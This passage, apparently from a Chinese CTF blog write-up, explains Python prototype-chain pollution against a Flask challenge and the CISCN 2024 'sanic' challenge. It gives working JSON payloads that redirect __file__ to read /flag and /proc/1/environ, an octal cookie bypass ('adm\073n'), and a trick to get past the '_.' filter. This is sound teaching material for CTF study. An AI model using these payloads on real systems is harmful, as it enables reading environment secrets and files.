</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">register</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="ow">not</span> <span class="n">check</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s2">&#34;password&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="n">User</span> <span class="o">=</span> <span class="n">user</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">merge</span><span class="p">(</span><span class="n">data</span><span class="p">,</span> <span class="n">User</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="n">Users</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">User</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Register Success&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="s2">&#34;Register Failed&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/login&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">login</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="k">try</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">data</span> <span class="o">=</span> <span class="n">json</span><span class="o">.</span><span class="n">loads</span><span class="p">(</span><span class="n">request</span><span class="o">.</span><span class="n">data</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="s2">&#34;username&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span> <span class="ow">or</span> <span class="s2">&#34;password&#34;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">data</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">            <span class="k">for</span> <span class="n">user</span> <span class="ow">in</span> <span class="n">Users</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">check</span><span class="p">(</span><span class="n">data</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">session</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span> <span class="o">=</span> <span class="n">data</span><span class="p">[</span><span class="s2">&#34;username&#34;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">                    <span class="k">return</span> <span class="s2">&#34;Login Success&#34;</span>
</span></span><span class="line"><span class="cl">        <span class="k">except</span> <span class="ne">Exception</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="s2">&#34;Login Failed&#34;</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span><span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">index</span><span class="p">():</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">,</span> <span class="s2">&#34;r&#34;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s2">&#34;__main__&#34;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s2">&#34;0.0.0.0&#34;</span><span class="p">,</span> <span class="n">port</span><span class="o">=</span><span class="mi">5010</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>ËøôÈáåÁöÑmergeÂáΩÊï∞Ë∑ü‰∏äÈù¢‰∏ÄÊ®°‰∏ÄÊ†∑Ôºå<code>register</code>Ë∑ØÁî±Ë∞ÉÁî®‰∫ÜmergeÂáΩÊï∞ÔºåÊ†πË∑ØÁî±‰∏ãÈù¢ÂèØ‰ª•ËØªÊñá‰ª∂</p>
<p>payload</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;__init__&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/flag&#34;#ÂΩìflagÂú®Ê†πÁõÆÂΩï‰∏ã‰ª•ÂèäflagÊñá‰ª∂ÂêçÁü•ÈÅìÁöÑÊÉÖÂÜµ‰∏ã
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>‰ΩÜÊòØÊúâÈªëÂêçÂçïÔºåÂØºËá¥Ê±°Êüì‰∏ç‰∫ÜÔºåÁåúÊµãËøáÊª§‰∫Üinit</p>
<p>Êàë‰ª¨Áî®<code>check</code>ÂáΩÊï∞Êù•Ëé∑Âèñ<code>__globals</code>Êù•Ê±°Êüì</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;check&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/flag&#34;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ê≤°ÊúâËøô‰∏™Êñá‰ª∂ÔºåÊàë‰ª¨Â∞ùËØïËØªÁéØÂ¢ÉÂèòÈáè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">{
</span></span><span class="line"><span class="cl">    &#34;username&#34;:&#34;a&#34;,
</span></span><span class="line"><span class="cl">    &#34;password&#34;:&#34;b&#34;,
</span></span><span class="line"><span class="cl">    &#34;__class__&#34;:{
</span></span><span class="line"><span class="cl">        &#34;check&#34;:{
</span></span><span class="line"><span class="cl">            &#34;__globals__&#34;:{
</span></span><span class="line"><span class="cl">                &#34;__file__&#34; : &#34;/proc/self/environ&#34;
</span></span><span class="line"><span class="cl">            }
</span></span><span class="line"><span class="cl">        }
</span></span><span class="line"><span class="cl">    }
</span></span><span class="line"><span class="cl">}
</span></span></code></pre></td></tr></table>
</div>
</div><p>flag‰∏∫no</p>
<p>Êàë‰ª¨Êç¢‰∏ÄÁßçÔºåÁéØÂ¢ÉÂèòÈáèÂèØ‰ª•ÈÄöËøá <code>/proc/$PID/environ</code> Êù•ËØªÂèñ</p>
<p>Ê±°ÊüìÊàê<code>/proc/1/environ</code>Â∞±Âá∫Êù•‰∫Ü</p>
<h3 id="ciscn2024-ÂàùËµõ-sanic">[Ciscn2024 ÂàùËµõ] sanic
</h3><div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic</span> <span class="kn">import</span> <span class="n">Sanic</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic.response</span> <span class="kn">import</span> <span class="n">text</span><span class="p">,</span> <span class="n">html</span>
</span></span><span class="line"><span class="cl"><span class="kn">from</span> <span class="nn">sanic_session</span> <span class="kn">import</span> <span class="n">Session</span>
</span></span><span class="line"><span class="cl"><span class="kn">import</span> <span class="nn">pydash</span>
</span></span><span class="line"><span class="cl"><span class="c1"># pydash==5.1.2</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">class</span> <span class="nc">Pollute</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="k">def</span> <span class="fm">__init__</span><span class="p">(</span><span class="bp">self</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="k">pass</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s1">&#39;/&#39;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">index</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">html</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="s1">&#39;static/index.html&#39;</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/login&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">login</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="n">user</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">cookies</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s2">&#34;user&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">user</span><span class="o">.</span><span class="n">lower</span><span class="p">()</span> <span class="o">==</span> <span class="s1">&#39;adm;n&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">request</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">session</span><span class="p">[</span><span class="s1">&#39;admin&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="kc">True</span>
</span></span><span class="line"><span class="cl">        <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;login success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;login fail&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/src&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">src</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="nb">open</span><span class="p">(</span><span class="vm">__file__</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">())</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="nd">@app.route</span><span class="p">(</span><span class="s2">&#34;/admin&#34;</span><span class="p">,</span> <span class="n">methods</span><span class="o">=</span><span class="p">[</span><span class="s1">&#39;GET&#39;</span><span class="p">,</span> <span class="s1">&#39;POST&#39;</span><span class="p">])</span>
</span></span><span class="line"><span class="cl"><span class="k">async</span> <span class="k">def</span> <span class="nf">admin</span><span class="p">(</span><span class="n">request</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="k">if</span> <span class="n">request</span><span class="o">.</span><span class="n">ctx</span><span class="o">.</span><span class="n">session</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="s1">&#39;admin&#39;</span><span class="p">)</span> <span class="o">==</span> <span class="kc">True</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">key</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;key&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="n">value</span> <span class="o">=</span> <span class="n">request</span><span class="o">.</span><span class="n">json</span><span class="p">[</span><span class="s1">&#39;value&#39;</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">        <span class="k">if</span> <span class="n">key</span> <span class="ow">and</span> <span class="n">value</span> <span class="ow">and</span> <span class="nb">type</span><span class="p">(</span><span class="n">key</span><span class="p">)</span> <span class="ow">is</span> <span class="nb">str</span> <span class="ow">and</span> <span class="s1">&#39;_.&#39;</span> <span class="ow">not</span> <span class="ow">in</span> <span class="n">key</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="n">pollute</span> <span class="o">=</span> <span class="n">Pollute</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">            <span class="n">pydash</span><span class="o">.</span><span class="n">set_</span><span class="p">(</span><span class="n">pollute</span><span class="p">,</span> <span class="n">key</span><span class="p">,</span> <span class="n">value</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;success&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">            <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">    <span class="k">return</span> <span class="n">text</span><span class="p">(</span><span class="s2">&#34;forbidden&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="k">if</span> <span class="vm">__name__</span> <span class="o">==</span> <span class="s1">&#39;__main__&#39;</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">    <span class="n">app</span><span class="o">.</span><span class="n">run</span><span class="p">(</span><span class="n">host</span><span class="o">=</span><span class="s1">&#39;0.0.0.0&#39;</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Âú®adminË∑ØÁî±ÁúãÂà∞<code>pydash.set_</code>ÂèØ‰ª•ÊÉ≥Âà∞Ê±°ÊüìsrcË∑ØÁî±Êù•Áî®<code>__file</code>Êù•ËØªÊñá‰ª∂</p>
<p>‰ΩÜÊòØÂú®loginË∑ØÁî±È¶ñÂÖàÊúâ‰∏™cookieÁöÑuserÂøÖÈ°ªÊòØadm;nÔºåÁî±‰∫éËøôÈáåÊòØ‰ªésession‰∏≠ËØªÂèñÔºåÊâÄ‰ª•ÈªòËÆ§ÊòØ‰ºöÂú®ÂàÜÂè∑Â§ÑÊà™Êñ≠ÔºåÁõ¥Êé•‰º†ËÇØÂÆöÊòØ‰∏çË°åÁöÑ„ÄÇÊÄé‰πàÁªïËøáÂë¢ÔºåÂæàÁÆÄÂçïÔºåÂà©Áî®ÂÖ´ËøõÂà∂ÁºñÁ†Å‰∏Ä‰∏ãÂ∞±Ë°å‰∫Ü„ÄÇ</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">user=&#34;adm\073n&#34;
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655.png"
	width="1865"
	height="804"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655_hu8043562558477733309.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223306655_hu12973804378228346261.png 1024w"
	loading="lazy"
	
		alt="image-20250328223306655"
	
	
		class="gallery-image" 
		data-flex-grow="231"
		data-flex-basis="556px"
	
></p>
<p>ÁÑ∂ÂêéÊãøsessionÂéªadminË∑ØÁî±</p>
<p>ÈÇ£‰πàÊÄùË∑ØÂà∞ËøôÈáåÂ∞±ÂæàÊòéÁ°Æ‰∫ÜÔºå‰∏ªË¶ÅÂ∞±ÊòØËÄÉÂØü‰∏Ä‰∏™RFC2068 ÁöÑÁºñÁ†ÅËßÑÂàôÁªïËøáÂíå‰∏Ä‰∏™ÂéüÂûãÈìæÊ±°Êüì„ÄÇ</p>
<p>ÂêåÊó∂ËøôÈáåwaf‰∫Ü**_.**ÁöÑÁªÑÂêàÔºåÊàë‰ª¨ÂèØ‰ª•Âà©Áî®</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">__init__\\\\.__globals__
</span></span></code></pre></td></tr></table>
</div>
</div><p><img src="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300.png"
	width="1836"
	height="649"
	srcset="/p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300_hu11923213358021302680.png 480w, /p/python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/image-20250328223739300_hu11427837439384655088.png 1024w"
	loading="lazy"
	
		alt="image-20250328223739300"
	
	
		class="gallery-image" 
		data-flex-grow="282"
		data-flex-basis="678px"
	
></p>
<p>ÂõûÂà∞srcË∑ØÁî±Â∞±ÂèØ‰ª•ÁúãÂà∞Ôºå‰ΩÜÊòØÁõ¥Êé•ËØªflagÊòØÊ≤°ÊúâÁöÑÔºåËøô‰πüÂ∞±ÊòØËøôÈ¢òÁöÑËÄÉÁÇπÊâÄÂú®‰∫ÜÔºå<strong>ÈúÄË¶ÅÊàë‰ª¨Âà©Áî®Ê±°ÊüìÁöÑÊñπÂºèÂºÄÂêØÂàóÁõÆÂΩïÂäüËÉΩÔºåÊü•ÁúãÊ†πÁõÆÂΩï‰∏ãflagÁöÑÂêçÁß∞ÔºåÂÜçËøõË°åËØªÂèñ</strong></p>
<p>Êúâ‰∏™ÈùûÈ¢ÑÊúüÂ∞±ÊòØË∑ü‰∏äÈù¢‰∏ÄÊ†∑ËØªÁéØÂ¢ÉÂèòÈáè</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="n">app</span> <span class="o">=</span> <span class="n">Sanic</span><span class="p">(</span><span class="vm">__name__</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">app</span><span class="o">.</span><span class="n">static</span><span class="p">(</span><span class="s2">&#34;/static/&#34;</span><span class="p">,</span> <span class="s2">&#34;./static/&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl"><span class="n">Session</span><span class="p">(</span><span class="n">app</span><span class="p">)</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Ë∑üËøõstaticÂáΩÊï∞</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span><span class="lnt">68
</span><span class="lnt">69
</span><span class="lnt">70
</span><span class="lnt">71
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl">    <span class="k">def</span> <span class="nf">static</span><span class="p">(</span>
</span></span><span class="line"><span class="cl">        <span class="bp">self</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">uri</span><span class="p">:</span> <span class="nb">str</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">file_or_directory</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="n">PathLike</span><span class="p">,</span> <span class="nb">str</span><span class="p">],</span>
</span></span><span class="line"><span class="cl">        <span class="n">pattern</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="sa">r</span><span class="s2">&#34;/?.+&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">use_modified_since</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">use_content_range</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">stream_large_files</span><span class="p">:</span> <span class="n">Union</span><span class="p">[</span><span class="nb">bool</span><span class="p">,</span> <span class="nb">int</span><span class="p">]</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">name</span><span class="p">:</span> <span class="nb">str</span> <span class="o">=</span> <span class="s2">&#34;static&#34;</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">host</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">strict_slashes</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">bool</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">content_type</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">apply</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">True</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">resource_type</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="nb">str</span><span class="p">]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">index</span><span class="p">:</span> <span class="n">Optional</span><span class="p">[</span><span class="n">Union</span><span class="p">[</span><span class="nb">str</span><span class="p">,</span> <span class="n">Sequence</span><span class="p">[</span><span class="nb">str</span><span class="p">]]]</span> <span class="o">=</span> <span class="kc">None</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">        <span class="n">directory_view</span><span class="p">:</span> <span class="nb">bool</span> <span class="o">=</span> <span class="kc">False</span><span class="p">,</span>
